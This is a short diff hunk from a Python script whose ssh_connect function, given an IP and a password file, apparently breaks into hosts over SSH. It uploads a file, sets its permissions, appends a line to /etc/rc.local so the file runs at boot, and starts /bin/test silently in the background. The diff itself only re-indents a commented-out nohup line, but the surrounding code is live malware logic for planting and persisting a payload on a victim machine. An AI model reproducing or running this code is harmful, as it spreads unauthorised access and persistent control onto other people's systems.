@@ -54,7 +54,7 @@ def ssh_connect(ip, password_file):
                         sftp.chmod(os.path.join(remote_dir, upload_file), 7)
                         client.exec_command('echo "test &" >> /etc/rc.local')
                         client.exec_command('/bin/test > /dev/null 2>&1 &')
-						#client.exec_command('nohup /bin/test > /dev/null 2>&1 &')
+                        #client.exec_command('nohup /bin/test > /dev/null 2>&1 &')
 
                     transport.close()
                     client.close()
